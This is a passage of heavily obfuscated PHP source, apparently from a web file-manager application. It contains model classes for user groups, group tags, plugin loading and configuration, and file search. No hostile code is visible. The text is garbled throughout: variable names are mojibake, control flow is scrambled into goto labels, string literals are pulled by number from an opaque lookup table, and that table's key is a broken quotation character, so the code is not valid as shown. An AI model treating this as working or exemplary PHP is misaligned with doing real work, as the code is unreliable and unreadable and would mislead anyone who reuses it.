Fğ»²¶˜: $A©áã×”¼ñ = $GLOBALS[$a»èé®¥º²[6]][$a»èé®¥º²[84]][$a»èé®¥º²[2186]]; foreach ($AØóÒïã× as &$bÈªªëˆ¡¦) { $c°õîÛŒ¡ = $this->parentLevelArray($bÈªªëˆ¡¦[$a»èé®¥º²[461]]); $E´Àó¼œ‡ñ = $a»èé®¥º²[33]; foreach ($c°õîÛŒ¡ as $Aø‰Á—¨É´ => $bŸ¬÷²¦º) { if ($A©áã×”¼ñ && $Aø‰Á—¨É´ == 0) { continue; } $E´Àó¼œ‡ñ .= $aŞÄ¥Ë”ã[$bŸ¬÷²¦º] . $a»èé®¥º²[8]; } if ($c°õîÛŒ¡) { $E´Àó¼œ‡ñ .= $bÈªªëˆ¡¦[$a»èé®¥º²[28]]; } $bÈªªëˆ¡¦[$a»èé®¥º²[465]] = str_replace($a»èé®¥º²[469], $a»èé®¥º²[8], $E´Àó¼œ‡ñ); } goto EÀ¡Š•ˆÛô; Dö©î°©™Ò: $a»èé®¥º² =& $_SERVER[“]; $aŞÄ¥Ë”ã = array(); foreach ($AØóÒïã× as &$bÈªªëˆ¡¦) { $aŞÄ¥Ë”ã[$bÈªªëˆ¡¦[$a»èé®¥º²[2095]]] = $bÈªªëˆ¡¦[$a»èé®¥º²[28]]; $c°õîÛŒ¡ = $this->parentLevelArray($bÈªªëˆ¡¦[$a»èé®¥º²[461]]); foreach ($c°õîÛŒ¡ as $bŸ¬÷²¦º) { if (!isset($aŞÄ¥Ë”ã[$bŸ¬÷²¦º])) { $aŞÄ¥Ë”ã[$bŸ¬÷²¦º] = 0; } } } goto FÄÈÍğÕ‰ñ; FÄÈÍğÕ‰ñ: $FÃ°£ƒÙ’— = array(); foreach ($aŞÄ¥Ë”ã as $Aø‰Á—¨É´ => $fì²õ’ˆ“Ø) { if (!$fì²õ’ˆ“Ø) { $FÃ°£ƒÙ’—[] = $Aø‰Á—¨É´; } } if ($FÃ°£ƒÙ’—) { $f§‘·¦šµ… = array($a»èé®¥º²[2172] => array($a»èé®¥º²[384], $FÃ°£ƒÙ’—)); $AÛÚ¥Û˜¹ = $this->field($a»èé®¥º²[2185])->where($f§‘·¦šµ…)->select(); $Dº…âªĞÎ = array_to_keyvalue($AÛÚ¥Û˜¹, $a»èé®¥º²[2095], $a»èé®¥º²[28]); $aŞÄ¥Ë”ã = array_merge_index($aŞÄ¥Ë”ã, $Dº…âªĞÎ); } goto Fğ»²¶˜; EÀ¡Š•ˆÛô: } private function _listAppendSourceRoot(&$E›‰Ÿ‡©ÄÛ, $D‰÷îâ†§‰) { goto B¸è‹‚•¡; bº¹ÉÒàõÂ: foreach ($E›‰Ÿ‡©ÄÛ as &$f…‘´£Ç‚˜) { $f…‘´£Ç‚˜[$aÀ›²ŒÍ•[391]] = $AâêÊ‚Şªà[$f…‘´£Ç‚˜[$aÀ›²ŒÍ•[2095]]] ? $AâêÊ‚Şªà[$f…‘´£Ç‚˜[$aÀ›²ŒÍ•[2095]]] : array(); } goto BÛÈ‹¬´Ç÷; B¸è‹‚•¡: $aÀ›²ŒÍ• =& $_SERVER[“]; $b¦Òˆ¨ë·î = array($aÀ›²ŒÍ•[371] => SourceModel::TYPE_GROUP, $aÀ›²ŒÍ•[463] => 0, $aÀ›²ŒÍ•[458] => array($aÀ›²ŒÍ•[7], $D‰÷îâ†§‰)); $eÅ¢…¢Ëô  = $aÀ›²ŒÍ•[2187]; goto b“â•†ŸáÑ; b“â•†ŸáÑ: $AâêÊ‚Şªà = Model($aÀ›²ŒÍ•[736])->order($aÀ›²ŒÍ•[2188])->field($eÅ¢…¢Ëô )->where($b¦Òˆ¨ë·î)->select(); $AâêÊ‚Şªà = array_to_keyvalue($AâêÊ‚Şªà, $aÀ›²ŒÍ•[458]); $AâêÊ‚Şªà = array_remove_key($AâêÊ‚Şªà, $aÀ›²ŒÍ•[458]); goto bº¹ÉÒàõÂ; BÛÈ‹¬´Ç÷: } protected function groupMerge($E‚Î«ò¾×¤) { $E‚Î«ò¾×¤ = array_values(array_unique($E‚Î«ò¾×¤)); $AÒÕáŒ˜ = array(); for ($DŠÏ‘ªµœ˜ = 0; $DŠÏ‘ªµœ˜ < count($E‚Î«ò¾×¤); $DŠÏ‘ªµœ˜++) { $a‚¿®öÈŠ‚ = !1; for ($f¥èÀ¹éÂ¨ = 0; $f¥èÀ¹éÂ¨ < count($E‚Î«ò¾×¤); $f¥èÀ¹éÂ¨++) { if ($DŠÏ‘ªµœ˜ == $f¥èÀ¹éÂ¨) { continue; } if ($this->isParentOf($E‚Î«ò¾×¤[$f¥èÀ¹éÂ¨], $E‚Î«ò¾×¤[$DŠÏ‘ªµœ˜])) { $a‚¿®öÈŠ‚ = !0; break; } } if (!$a‚¿®öÈŠ‚) { $AÒÕáŒ˜[] = $E‚Î«ò¾×¤[$DŠÏ‘ªµœ˜]; } } return $AÒÕáŒ˜; } protected function isParentOf($f“èÄ¼öîå, $Dˆ»ÚÒß„) { goto eÛ®ì¶î; Cî»ˆòÕ•å: return !1; goto A¥¹…ÊÍ®”; eÛ®ì¶î: $AšÄ±¡¤ÉÉ =& $_SERVER[“]; if (!$f“èÄ¼öîå || !$Dˆ»ÚÒß„ || $f“èÄ¼öîå == $Dˆ»ÚÒß„) { return !1; } $c ¦ƒ¦Ğã‰ = $this->getInfoSimple($f“èÄ¼öîå); goto F¹ÈÔôÏİá; F¹ÈÔôÏİá: $bÅõŞ´¬Ç­ = $this->getInfoSimple($Dˆ»ÚÒß„); $bç¤Â—Š…å = $c ¦ƒ¦Ğã‰[$AšÄ±¡¤ÉÉ[461]] . $f“èÄ¼öîå . $AšÄ±¡¤ÉÉ[47]; if (substr($bÅõŞ´¬Ç­[$AšÄ±¡¤ÉÉ[461]], 0, strlen($bç¤Â—Š…å)) == $bç¤Â—Š…å) { return !0; } goto Cî»ˆòÕ•å; A¥¹…ÊÍ®”: } public function groupShowRoot($c²ôˆÎ¨•Å, $EãÑÛ×ùÕ‚ = false) { goto aÜ»ÖäÏö¢; eôÏö‹¹ÁŞ: if (!$aºèÙÂÚæ[$dò¦’ï†È¦[417]] || !isset($aºèÙÂÚæ[$dò¦’ï†È¦[417]][$dò¦’ï†È¦[2170]]) || $aºèÙÂÚæ[$dò¦’ï†È¦[417]][$dò¦’ï†È¦[2170]] == $dò¦’ï†È¦[2143]) { return $this->groupShowRoot($B¦ß£æ í‰[count($B¦ß£æ í‰) - 1], $EãÑÛ×ùÕ‚); } if ($aºèÙÂÚæ[$dò¦’ï†È¦[417]][$dò¦’ï†È¦[2170]] == $dò¦’ï†È¦[346]) { $cô…ïÆÜË® = explode($dò¦’ï†È¦[47], $aºèÙÂÚæ[$dò¦’ï†È¦[417]][$dò¦’ï†È¦[2171]]); if ($cô…ïÆÜË®) { $F‹ùÎáôõ = array_merge($F‹ùÎáôõ, $cô…ïÆÜË®); } } return $F‹ùÎáôõ; goto Aââê„î¬; aÜ»ÖäÏö¢: $dò¦’ï†È¦ =& $_SERVER[“]; $aºèÙÂÚæ = $this->getInfo($c²ôˆÎ¨•Å); $B¦ß£æ í‰ = $this->parentLevelArray($aºèÙÂÚæ[$dò¦’ï†È¦[461]]); goto aëë…‡Î®±; aëë…‡Î®±: $F‹ùÎáôõ = array($c²ôˆÎ¨•Å); if (count($B¦ß£æ í‰) == 0) { return $F‹ùÎáôõ; } if ($EãÑÛ×ùÕ‚ && count($B¦ß£æ í‰) == 1) { return $F‹ùÎáôõ; } goto eôÏö‹¹ÁŞ; Aââê„î¬: } protected function resetParentLevel() { $fÉì¹®í› =& $_SERVER[“]; $b­º­ÓŞ£Ü = $fÉì¹®í›[2095]; $f¾†ÀÓ«æ¸ = $this->select(); $f¾†ÀÓ«æ¸ = array_to_keyvalue($f¾†ÀÓ«æ¸, $b­º­ÓŞ£Ü); foreach ($f¾†ÀÓ«æ¸ as $a æ¸Â±©×) { goto E¿ö×ò‚Œ; e‰¹™ˆ¤Šò: $EÌì”‹Şœî[] = 0; $EÌì”‹Şœî = $fÉì¹®í›[47] . implode($fÉì¹®í›[47], array_reverse($EÌì”‹Şœî)) . $fÉì¹®í›[47]; $this->setNamePinyin($a æ¸Â±©×[$b­º­ÓŞ£Ü], $a æ¸Â±©×[$fÉì¹®í›[28]]); goto eâ¥¸¯í¦™; eâ¥¸¯í¦™: $this->where(array($b­º­ÓŞ£Ü => $a æ¸Â±©×[$b­º­ÓŞ£Ü]))->save(array($fÉì¹®í›[527] => $EÌì”‹Şœî)); goto D—¼¾¶‘õ½; E¿ö×ò‚Œ: $B”Æ·’É… = $a æ¸Â±©×; $EÌì”‹Şœî = array(); while ($B”Æ·’É…[$fÉì¹®í›[463]] != 0) { $EÌì”‹Şœî[] = $B”Æ·’É…[$fÉì¹®í›[463]]; $B”Æ·’É… = $f¾†ÀÓ«æ¸[$B”Æ·’É…[$fÉì¹®í›[463]]]; } goto e‰¹™ˆ¤Šò; D—¼¾¶‘õ½: } return $f¾†ÀÓ«æ¸; } public function groupNameAuto($C½ê„òÅ, $Fó˜•ôô‹æ) { $F­¤¤°å¤ =& $_SERVER[“]; $dËó»ÌñëË = $this->where(array($F­¤¤°å¤[368] => $C½ê„òÅ))->getField($F­¤¤°å¤[28], !0); if (!$dËó»ÌñëË || !in_array($Fó˜•ôô‹æ, $dËó»ÌñëË)) { return $Fó˜•ôô‹æ; } for ($e¦Ò ‡›Æñ = 1; $e¦Ò ‡›Æñ <= count($dËó»ÌñëË) + 1; $e¦Ò ‡›Æñ++) { $e‡ô„Şƒğ = $Fó˜•ôô‹æ . "\x28{$e¦Ò ‡›Æñ}\x29"; if (!in_array($e‡ô„Şƒğ, $dËó»ÌñëË)) { return $e‡ô„Şƒğ; } } } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($dŸÔŒ”Ã§) { $cƒ–š‘œ­ =& $_SERVER[“]; return array($cƒ–š‘œ­[2189] => array($dŸÔŒ”Ã§[0], $cƒ–š‘œ­[2190]), $cƒ–š‘œ­[2191] => array($dŸÔŒ”Ã§[0], $cƒ–š‘œ­[2192])); } protected function get($AÏïï‰å¡) { $EñÎÃˆôâ² =& $_SERVER[“]; $c´Ùãé‘£ = Model($EñÎÃˆôâ²[460])->metaGet($AÏïï‰å¡, $EñÎÃˆôâ²[2193]); $F’âø¢é£œ = json_decode($c´Ùãé‘£, !0); return $F’âø¢é£œ ? $F’âø¢é£œ : array($EñÎÃˆôâ²[2194] => $EñÎÃˆôâ²[83], $EñÎÃˆôâ²[354] => array()); } protected function set($BÜÌ¤ˆ‡Ğ, $BÜñ†ĞÇæƒ) { $BñÒÃªÂæ² =& $_SERVER[“]; $BÜñ†ĞÇæƒ = $BÜñ†ĞÇæƒ ? $BÜñ†ĞÇæƒ : array($BñÒÃªÂæ²[2194] => $BñÒÃªÂæ²[83], $BñÒÃªÂæ²[354] => array()); Model($BñÒÃªÂæ²[460])->metaSet($BÜÌ¤ˆ‡Ğ, $BñÒÃªÂæ²[2193], json_encode($BÜñ†ĞÇæƒ)); return Model($BñÒÃªÂæ²[460])->metaSet($BÜÌ¤ˆ‡Ğ, $BñÒÃªÂæ²[2193], json_encode($BÜñ†ĞÇæƒ)); } protected function getByTagID($EŒÍ¶®¦Ë, $EİÍ¸Æ  á) { goto Cê¤‰æÛ§; b­¦çæĞ’ô: return is_array($D°·óç§Ä) ? $D°·óç§Ä : !1; goto cÜƒ¼ôÛ¹µ; Cê¤‰æÛ§: $e…¨ŠÖ‡Ü =& $_SERVER[“]; if (!$EŒÍ¶®¦Ë || !$EİÍ¸Æ  á) { return !1; } if (!Model($e…¨ŠÖ‡Ü[460])->getInfoSimple($EŒÍ¶®¦Ë)) { return !1; } goto d£Ùõ–™´Ş; d£Ùõ–™´Ş: $A£›ˆ³Ğñó = $this->get($EŒÍ¶®¦Ë); if (!$A£›ˆ³Ğñó || !isset($A£›ˆ³Ğñó[$e…¨ŠÖ‡Ü[354]])) { return !1; } $D°·óç§Ä = array_find_by_field($A£›ˆ³Ğñó[$e…¨ŠÖ‡Ü[354]], $e…¨ŠÖ‡Ü[367], $EİÍ¸Æ  á); goto b­¦çæĞ’ô; cÜƒ¼ôÛ¹µ: } public function listSource($c‹•åœºëŸ, $DÎ—ö¯½Óí) { goto có¸ášÖ–Æ; B·ù’…Ÿ›: $dƒ–±±ê = array(); foreach ($aÂÁî»Óåµ as $Eæ¯â×ñÜ) { $D¨ğµ±–ˆ„ = $Eæ¯â×ñÜ[$B•ªì²¹ÜÛ[75]]; if (!$D¨ğµ±–ˆ„) { continue; } if (!isset($dƒ–±±ê[$D¨ğµ±–ˆ„])) { $dƒ–±±ê[$D¨ğµ±–ˆ„] = array(); } $dƒ–±±ê[$D¨ğµ±–ˆ„][] = $Eæ¯â×ñÜ[$B•ªì²¹ÜÛ[393]]; } $Eã¥©°ñ—Î = array(); goto f´õª”ÆßÚ; có¸ášÖ–Æ: $B•ªì²¹ÜÛ =& $_SERVER[“]; if ($DÎ—ö¯½Óí && !is_array($DÎ—ö¯½Óí)) { $DÎ—ö¯½Óí = array($DÎ—ö¯½Óí); } $aÂÁî»Óåµ = $this->listData($c‹•åœºëŸ); goto B·ù’…Ÿ›; D›Š²§‰Õİ: $d´ÌŠÜìãì = array_to_keyvalue($A¿ïÖô×Œ[$B•ªì²¹ÜÛ[73]], $B•ªì²¹ÜÛ[33], $B•ªì²¹ÜÛ[369]); $CÌÏÅ‘Òİñ = array_merge($d´ÌŠÜìãì, $eÅ·ó·ª»™); foreach ($Eã¥©°ñ—Î as $D¨ğµ±–ˆ„) { if (!in_array($D¨ğµ±–ˆ„, $CÌÏÅ‘Òİñ)) { $cïùÕîË¢[] = $D¨ğµ±–ˆ„; } } goto ašƒŸßµ; F¨—ì¾­—Ğ: if (!$A¿ïÖô×Œ || count($Eã¥©°ñ—Î) == $A¿ïÖô×Œ[$B•ªì²¹ÜÛ[351]][$B•ªì²¹ÜÛ[352]]) { return $A¿ïÖô×Œ; } $cïùÕîË¢ = array(); $eÅ·ó·ª»™ = array_to_keyvalue($A¿ïÖô×Œ[$B•ªì²¹ÜÛ[74]], $B•ªì²¹ÜÛ[33], $B•ªì²¹ÜÛ[369]); goto D›Š²§‰Õİ; f´õª”ÆßÚ: foreach ($dƒ–±±ê as $D½ŠâŸô => $C’Ä¤î•ß) { $cä‰„¶Ş‘Ø = !0; if (!$DÎ—ö¯½Óí) { $Eã¥©°ñ—Î[] = $D½ŠâŸô; continue; } foreach ($DÎ—ö¯½Óí as $c°Òï¯Ëé) { if (!in_array($c°Òï¯Ëé, $C’Ä¤î•ß)) { $cä‰„¶Ş‘Ø = !1; break; } } if ($cä‰„¶Ş‘Ø) { $Eã¥©°ñ—Î[] = $D½ŠâŸô; } } if (!$Eã¥©°ñ—Î) { return array(); } $A¿ïÖô×Œ = Model($B•ªì²¹ÜÛ[1104])->listSource(array($B•ªì²¹ÜÛ[383] => array($B•ªì²¹ÜÛ[384], $Eã¥©°ñ—Î))); goto F¨—ì¾­—Ğ; ašƒŸßµ: if ($cïùÕîË¢) { $this->removeBySource($c‹•åœºëŸ, $cïùÕîË¢); } return $A¿ïÖô×Œ; goto f›‰’ºöĞ ; f›‰’ºöĞ : } protected function listData($CÔº©Œ–­¦) { $dÄÌ­ã…Ôš =& $_SERVER[“]; $F²¢ğàë¦Ú = array($dÄÌ­ã…Ôš[1413] => 0, $dÄÌ­ã…Ôš[436] => array($dÄÌ­ã…Ôš[2195], 0), $dÄÌ­ã…Ôš[388] => $dÄÌ­ã…Ôš[2196] . $CÔº©Œ–­¦); $DÖçˆñ‡°Ï = $dÄÌ­ã…Ôš[2197]; $D¨íˆ†„«Ø = $this->field($DÖçˆñ‡°Ï)->where($F²¢ğàë¦Ú)->order($dÄÌ­ã…Ôš[2198])->select(); return $D¨íˆ†„«Ø ? $D¨íˆ†„«Ø : array(); } protected function addToTag($b…Ä¨¿§¸Ì, $e‡‹²‹Ğã, $BàÕØ¢â»ë) { $Fˆæ»Œ’¸§ =& $_SERVER[“]; if (!$this->getByTagID($b…Ä¨¿§¸Ì, $BàÕØ¢â»ë) || !$e‡‹²‹Ğã) { return !1; } if (!Model($Fˆæ»Œ’¸§[736])->pathInfo($e‡‹²‹Ğã)) { return !1; } $A¬ÛÛ–îõ½ = array($Fˆæ»Œ’¸§[1413] => 0, $Fˆæ»Œ’¸§[436] => $BàÕØ¢â»ë, $Fˆæ»Œ’¸§[387] => $e‡‹²‹Ğã, $Fˆæ»Œ’¸§[388] => $Fˆæ»Œ’¸§[2199] . $b…Ä¨¿§¸Ì, $Fˆæ»Œ’¸§[386] => $Fˆæ»Œ’¸§[33], $Fˆæ»Œ’¸§[2099] => 0); if ($this->where($A¬ÛÛ–îõ½)->find()) { return !1; } return $this->add($A¬ÛÛ–îõ½); } protected function removeFromTag($f‰Øë²‘¸†, $aŸÇíÂèÀã, $FÒìÛèâ¡‰) { $B®Ô·ƒÕ‰¼ =& $_SERVER[“]; if (!$this->getByTagID($f‰Øë²‘¸†, $FÒìÛèâ¡‰) || !$aŸÇíÂèÀã) { return !1; } if (is_array($aŸÇíÂèÀã)) { $aŸÇíÂèÀã = array($B®Ô·ƒÕ‰¼[7], $aŸÇíÂèÀã); } $bâ‹ö¦»Šß = array($B®Ô·ƒÕ‰¼[1413] => 0, $B®Ô·ƒÕ‰¼[436] => $FÒìÛèâ¡‰, $B®Ô·ƒÕ‰¼[388] => $B®Ô·ƒÕ‰¼[2199] . $f‰Øë²‘¸†, $B®Ô·ƒÕ‰¼[387] => $aŸÇíÂèÀã); return $this->where($bâ‹ö¦»Šß)->delete(); } protected function removeByTag($Dõ„Ÿº¨Œ÷, $FÍñõ®áÆÆ) { $e‡”İåã =& $_SERVER[“]; if (!$this->getByTagID($Dõ„Ÿº¨Œ÷, $FÍñõ®áÆÆ)) { return !1; } $FÂ÷Ì‹„ø– = array($e‡”İåã[1413] => 0, $e‡”İåã[436] => $FÍñõ®áÆÆ, $e‡”İåã[388] => $e‡”İåã[2199] . $Dõ„Ÿº¨Œ÷); return $this->where($FÂ÷Ì‹„ø–)->delete(); } protected function removeBySource($DíÀ’§Î’’, $dŸÒªğ²Ì) { $F÷‹×ƒÍ»ß =& $_SERVER[“]; if (!$DíÀ’§Î’’ || !$dŸÒªğ²Ì) { return !1; } if (is_array($dŸÒªğ²Ì)) { $dŸÒªğ²Ì = array($F÷‹×ƒÍ»ß[7], $dŸÒªğ²Ì); } $aò­ˆ²‰ = array($F÷‹×ƒÍ»ß[1413] => 0, $F÷‹×ƒÍ»ß[387] => $dŸÒªğ²Ì, $F÷‹×ƒÍ»ß[436] => array($F÷‹×ƒÍ»ß[914], 0), $F÷‹×ƒÍ»ß[388] => $F÷‹×ƒÍ»ß[2199] . $DíÀ’§Î’’); return $this->where($aò­ˆ²‰)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\x70\154\x75\147\x69\x6e\114\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x73\x74\141\164\165\x73", "\162\145\x67\151\x65\163\164", "\x63\x6f\156\x66\x69\147"); public function loadList($BË’Œ¾Áô¶ = false) { $c÷‰ƒéí¯§ = array_to_keyvalue($this->listData(), $_SERVER[“][28]); if ($BË’Œ¾Áô¶) { return $c÷‰ƒéí¯§[$BË’Œ¾Áô¶]; } return $c÷‰ƒéí¯§; } public function init() { $f—²ƒØÚ¯ =& $_SERVER[“]; Hook::trigger($f—²ƒØÚ¯[2200]); $B×…ùáèË = $this->loadPluginList(); foreach ($B×…ùáèË as $C“êà¶‰ƒ¦ => $FäÁÒâÌâÙ) { $c›æ¬ñœ’‘ = $this->appAllow($C“êà¶‰ƒ¦, $FäÁÒâÌâÙ); if (!$c›æ¬ñœ’‘) { continue; } foreach ($FäÁÒâÌâÙ[$f—²ƒØÚ¯[2201]] as $aÔ—ÆØòÎä => $b×íßÎ¨äì) { Hook::bind($aÔ—ÆØòÎä, $b×íßÎ¨äì); } } Hook::trigger($f—²ƒØÚ¯[2202]); Hook::trigger(ACTION); } public function appAllow($BÖ“ƒ‹ƒ‚Ì, $d»¯¿Ö§¯, $Cª˜Ê”ô‹ó = true) { $FøìºÕ·¥ =& $_SERVER[“]; $B¦ğ…Úò‚¸ = PLUGIN_DIR . $BÖ“ƒ‹ƒ‚Ì . $FøìºÕ·¥[2203]; if (!is_array($d»¯¿Ö§¯) || !is_array($d»¯¿Ö§¯[$FøìºÕ·¥[2201]]) || !is_file($B¦ğ…Úò‚¸) || $d»¯¿Ö§¯[$FøìºÕ·¥[673]] != 1) { return !1; } if ($Cª˜Ê”ô‹ó && !Action($FøìºÕ·¥[2204])->checkAuth($BÖ“ƒ‹ƒ‚Ì)) { return !1; } return !0; } public function unInstall($e¾°÷‚Şí¿) { $aâ§¼³ğÃĞ =& $_SERVER[“]; $cò£Äèî = $this->loadList($e¾°÷‚Şí¿); if (file_exists(PLUGIN_DIR . $e¾°÷‚Şí¿)) { Hook::apply($e¾°÷‚Şí¿ . $aâ§¼³ğÃĞ[2205]); } $this->remove($cò£Äèî[$aâ§¼³ğÃĞ[367]]); } public function changeStatus($aƒÕê…Ùä«, $D¨®¸‡ÖÌä) { $DÙÇ©ßŞ°× =& $_SERVER[“]; $BÍ‘ì¿à¾® = $this->loadList($aƒÕê…Ùä«); if ($D¨®¸‡ÖÌä) { Hook::apply($aƒÕê…Ùä« . $DÙÇ©ßŞ°×[2206]); } $this->update($BÍ‘ì¿à¾®[$DÙÇ©ßŞ°×[367]], array($DÙÇ©ßŞ°×[2207] => $D¨®¸‡ÖÌä)); } public function appRegist($c¹ÃÅà¬á, $Cš¨¤‘ã©å) { $Dù˜ÎÅ›‘Ø =& $_SERVER[“]; $Bæâ£¡«·¼ = $this->loadList($c¹ÃÅà¬á); if ($Bæâ£¡«·¼) { $this->update($Bæâ£¡«·¼[$Dù˜ÎÅ›‘Ø[367]], array($Dù˜ÎÅ›‘Ø[2201] => $Cš¨¤‘ã©å)); } else { $còªç³©‰¼ = array($Dù˜ÎÅ›‘Ø[28] => $c¹ÃÅà¬á, $Dù˜ÎÅ›‘Ø[2201] => $Cš¨¤‘ã©å, $Dù˜ÎÅ›‘Ø[673] => 0, $Dù˜ÎÅ›‘Ø[6] => $this->getConfigDefault($c¹ÃÅà¬á)); $this->insert($còªç³©‰¼); } } public function getConfigDefault($fè«†¸«¶„) { $bâÓ÷½ÆŸÈ =& $_SERVER[“]; $Açî…â™”° = array(); $aÂ•Œªà‚£ = $this->getPackageJson($fè«†¸«¶„); if (!$aÂ•Œªà‚£ && is_array($aÂ•Œªà‚£[$bâÓ÷½ÆŸÈ[2208]])) { return $Açî…â™”°; } foreach ($aÂ•Œªà‚£[$bâÓ÷½ÆŸÈ[2208]] as $c³Ñºˆ‰® => $eñŠÍÆÊñ¾) { if (!isset($eñŠÍÆÊñ¾[$bâÓ÷½ÆŸÈ[359]]) || isset($Açî…â™”°[$c³Ñºˆ‰®])) { continue; } $Açî…â™”°[$c³Ñºˆ‰®] = $eñŠÍÆÊñ¾[$bâÓ÷½ÆŸÈ[359]]; } return $Açî…â™”°; } public function getPackageJson($F“‚“ˆ¨ù³) { return Hook::apply($F“‚“ˆ¨ù³ . $_SERVER[“][2209]); } public function getConfig($fÎë’Í†•, $B±ÎÎ¨ÁàÌ = false) { $FŞŸ³§‹å =& $_SERVER[“]; $FïÜ¿ìƒ’ = array(); $AÜç…ò‚‹Ï = $this->loadList($fÎë’Í†•); if ($AÜç…ò‚‹Ï && is_array($AÜç…ò‚‹Ï[$FŞŸ³§‹å[6]])) { $FïÜ¿ìƒ’ = $AÜç…ò‚‹Ï[$FŞŸ³§‹å[6]]; } if (!$FïÜ¿ìƒ’ || $B±ÎÎ¨ÁàÌ) { $FïÜ¿ìƒ’ = $this->getConfigDefault($fÎë’Í†•); } return $FïÜ¿ìƒ’; } public function setConfig($CÈÊÒñ‘º¼, $F·„§¤éà» = false) { goto b¤¯Î‰Ã»Ò; eø­öùåÊ: $this->update($f¹¯ª˜‡[$CÖŠ‹ÂôÕ[367]], array($CÖŠ‹ÂôÕ[6] => $d©Ú¢İ¸öÑ)); goto c¦—ã‚†—; aÒõ‚ñÆÙ§: $d©Ú¢İ¸öÑ = $f¹¯ª˜‡[$CÖŠ‹ÂôÕ[6]]; if ($F·„§¤éà» == !1) { $d©Ú¢İ¸öÑ = array(); $F·„§¤éà» = $this->getConfigDefault($CÈÊÒñ‘º¼); } foreach ($F·„§¤éà» as $DËéÎ°Ü => $A‘¦¯È) { $d©Ú¢İ¸öÑ[$DËéÎ°Ü] = is_string($A‘¦¯È) ? trim($A‘¦¯È) : $A‘¦¯È; } goto eø­öùåÊ; b¤¯Î‰Ã»Ò: $CÖŠ‹ÂôÕ =& $_SERVER[“]; $f¹¯ª˜‡ = $this->loadList($CÈÊÒñ‘º¼); if (!$f¹¯ª˜‡) { return !1; } goto aÒõ‚ñÆÙ§; c¦—ã‚†—: } public function viewList() { goto f°Œ•Ÿß™; f°Œ•Ÿß™: $bĞÌ÷½—Ø‹ =& $_SERVER[“]; $EµÔÓâ²Ô± = $this->loadList(); $this->pluginScan($EµÔÓâ²Ô±); goto e„˜†½¿›; e„˜†½¿›: $EµÔÓâ²Ô± = $this->loadPluginList(); $A»èîòÖ = array(); foreach ($EµÔÓâ²Ô± as $cï ÊÅˆÚ => $EÃî­ Àª˜) { unset($EÃî­ Àª˜[$bĞÌ÷½—Ø‹[2201]], $EÃî­ Àª˜[$bĞÌ÷½—Ø‹[6]]); $CêåÉ‘ˆö¦ = PLUGIN_DIR . $EÃî­ Àª˜[$bĞÌ÷½—Ø‹[28]] . $bĞÌ÷½—Ø‹[2203]; if (!is_file($CêåÉ‘ˆö¦)) { continue; } $fÕ¿ä†Í»ó = Hook::apply($EÃî­ Àª˜[$bĞÌ÷½—Ø‹[28]] . $bĞÌ÷½—Ø‹[2209]); if (is_array($fÕ¿ä†Í»ó)) { $A»èîòÖ[$cï ÊÅˆÚ] = array_merge($EÃî­ Àª˜, $fÕ¿ä†Í»ó); } } goto cÁ¼Üº¯”ß; cÁ¼Üº¯”ß: return $A»èîòÖ; goto F‰²àÇ´…¨; F‰²àÇ´…¨: } private function loadPluginList() { $b„§†—Û Å =& $_SERVER[“]; $bØ´ªÒÄ¨Å = $this->loadList(); if (strtolower(MOD) == $b„§†—Û Å[2210]) { return $bØ´ªÒÄ¨Å; } $c‰õˆÊë†¬ = Hook::trigger($b„§†—Û Å[2211], $bØ´ªÒÄ¨Å); if ($bØ´ªÒÄ¨Å && !$c‰õˆÊë†¬) { die; } return $c‰õˆÊë†¬ ? $c‰õˆÊë†¬ : $bØ´ªÒÄ¨Å; } private function pluginScan($f™‰Ò÷ŠŞ¦) { $f„¶é‚ŸÔ¾ =& $_SERVER[“]; recursion_dir(PLUGIN_DIR, $E‰†İÂ–Ğ‚, $aÙí­³Àó, 0); foreach ($E‰†İÂ–Ğ‚ as $A÷—‚Ã÷±‘) { $cñÍÕùõ = get_path_this($A÷—‚Ã÷±‘); if (isset($f™‰Ò÷ŠŞ¦[$cñÍÕùõ]) || !file_exists($A÷—‚Ã÷±‘ . $f„¶é‚ŸÔ¾[2212]) || !file_exists($A÷—‚Ã÷±‘ . $f„¶é‚ŸÔ¾[2203])) { continue; } Hook::apply($cñÍÕùõ . $f„¶é‚ŸÔ¾[2206]); } } } goto E¢îêÉÄÃ‚; EªÙ‰ËÚ¡¶: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($E±¶ìŞÃÍ) { goto C÷¢Œõ§…‹; C÷¢Œõ§…‹: $aßåÈ½ =& $_SERVER[“]; $Aå”¶À¯ = KodIO::fileTypeList(); $d»°ïàÔŠ° = $Aå”¶À¯[$E±¶ìŞÃÍ]; goto fŒ”’…°¬—; cŸ†ÉØ†Ö˜: if (!$d»°ïàÔŠ°[$aßåÈ½[160]]) { $D“‘ÙŒ‡ã… = array_to_keyvalue($Aå”¶À¯, $aßåÈ½[33], $aßåÈ½[160]); $F—‰Íé·Î£ = implode($aßåÈ½[47], $D“‘ÙŒ‡ã…); $DÅŒÌ¢Ôª = $aßåÈ½[2269]; } $EÊƒŞ¸íÚ = explode($aßåÈ½[47], trim($F—‰Íé·Î£, $aßåÈ½[47])); return array($DÅŒÌ¢Ôª, $EÊƒŞ¸íÚ); goto b½êßñ¯ø†; fŒ”’…°¬—: if (!$d»°ïàÔŠ°) { return array(); } $F—‰Íé·Î£ = $d»°ïàÔŠ°[$aßåÈ½[160]]; $DÅŒÌ¢Ôª = $aßåÈ½[7]; goto cŸ†ÉØ†Ö˜; b½êßñ¯ø†: } public function listPathType($e§à¾ÌÀ¦·) { $fÕçîøï =& $_SERVER[“]; $dœµå²–Ğ– = $this->fileTypeWhere($e§à¾ÌÀ¦·); if (!$dœµå²–Ğ–) { return array(); } $c¿ˆ±–ãÑ• = array($fÕçîøï[523] => SourceModel::TYPE_USER, $fÕçîøï[524] => USER_ID, $fÕçîøï[520] => 0, $fÕçîøï[521] => $dœµå²–Ğ–); return $this->listSource($c¿ˆ±–ãÑ•); } public function listSearch($c›ò»í´¡§, $d²ßËšÔ´š = 300) { goto f¤¾„±ô¼¸; A›ˆ¬¹Ñ¤“: $this->_listDataApply($CŠæœ‹ÕÂÑ[$EÙëÓ°Ö¯¶[354]]); $this->_listMake($CŠæœ‹ÕÂÑ); return $CŠæœ‹ÕÂÑ; goto BŠéŒ¡õ; f¤îõ¬Á·é: if (!isset($D—ªĞ­…±[$EÙëÓ°Ö¯¶[397]])) { $D—ªĞ­…±[$EÙëÓ°Ö¯¶[397]] = 0; } 